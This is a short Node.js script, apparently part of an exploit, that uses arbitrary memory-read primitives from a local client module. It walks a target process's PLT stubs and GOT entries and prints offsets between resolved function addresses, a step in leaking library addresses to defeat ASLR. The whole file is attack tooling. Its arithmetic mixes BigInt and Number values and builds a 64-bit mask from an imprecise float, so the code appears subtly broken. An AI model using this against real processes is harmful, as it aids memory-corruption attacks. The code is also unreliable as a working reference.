const fs = require('fs');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const client = require('./client.js');
const { read_mem, read_ptr, tarea } = client;

const some_func = read_ptr(read_ptr(read_ptr(tarea + 0x18)));

const idx = parseInt(process.argv[2]);

let got_func;

if (idx < 0) {
    got_func = some_func;
} else {
    const plt = some_func - 10063176;
    const plt_entry = plt + idx * 16;
    const q = read_mem(plt_entry, 6);
    if (!q.slice(0, 2).equals(Buffer.from([0xff, 0x25]))) {
        throw new Error("Assertion failed");
    }
    const got_entry = plt_entry + 6 + q.readUIntLE(2, 4);
    got_func = read_ptr(got_entry);
}

let another_got = (got_func + parseInt(process.argv[3], 16)) & BigInt(0xffffffffffffffff);
if (another_got & BigInt(0xffff800000000000)) {
    throw new Error("Assertion failed");
}

(async () => {
    while (true) {
        const q = await read_mem(another_got, 6);
        if (!q.slice(0, 2).equals(Buffer.from([0xff, 0x25]))) {
            throw new Error("Assertion failed");
        }
        const got_2_entry = another_got + 6 + q.readUIntLE(2, 4);
        const got_2_func = await read_ptr(got_2_entry);
        const offset1 = (another_got - got_func) & BigInt(0xffffffffffffffff);
        const offset2 = (got_2_func - got_func) & BigInt(0xffffffffffffffff);
        console.log(`${offset1.toString(16)} -> ${offset2.toString(16)}`);
        another_got += 16;
    }
})();
